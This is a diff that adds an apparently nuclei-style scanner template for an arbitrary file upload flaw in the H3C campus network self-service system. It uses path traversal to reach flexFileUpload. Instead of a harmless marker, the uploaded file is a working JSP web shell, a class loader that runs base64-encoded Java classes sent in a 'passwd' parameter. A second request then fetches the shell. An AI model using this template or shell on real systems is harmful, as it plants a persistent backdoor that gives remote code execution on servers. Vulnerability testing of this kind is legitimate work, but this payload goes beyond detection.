@@ -1,0 +1,71 @@
+id: h3c_campus_network_self_service_system_flexifileupload_arbitrary_file_upload
+info:
+  name: H3C 校园网自助服务系统 flexfileupload 任意文件上传
+  author: yueji0j1anke
+  severity: high
+  description: ''
+  reference: []
+  classification:
+    cvss-metrics: ''
+    cvss-score: 0.0
+    cve-id: ''
+    cwe-id: ''
+  tags: ''
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+  random_str: "{{rand_base(8)}}"
+  match_str: "{{md5(random_str)}}"
+
+requests:
+  - raw:
+      - |
+        POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
+        Content-Type: multipart/form-data; boundary=---------------{{boundary}}
+        Accept-Encoding: gzip
+
+        -----------------{{boundary}}
+        Content-Disposition: form-data; name=yuejinjianke.jsp; filename=yuejinjianke
+        Content-Type: application/octet-stream
+        
+        <%!
+          class U extends ClassLoader {
+            U(ClassLoader c) {
+              super(c);
+            }
+            public Class g(byte[] b) {
+              return super.defineClass(b, 0, b.length);
+            }
+          }
+
+          public byte[] base64Decode(String str) throws Exception {
+            try {
+              Class clazz = Class.forName("sun.misc.BASE64Decoder");
+              return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } catch (Exception e) {
+              Class clazz = Class.forName("java.util.Base64");
+              Object decoder = clazz.getMethod("getDecoder").invoke(null);
+              return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            }
+          }
+        %>
+        <%
+          String cls = request.getParameter("passwd");
+          if (cls != null) {
+            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+          }
+        %>
+
+        -----------------{{boundary}}--
+
+      - |
+        GET /imc/primepush/%2e%2e/flex/topobg/yuejinjianke.jsp HTTP/1.1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200 
+        condition: and
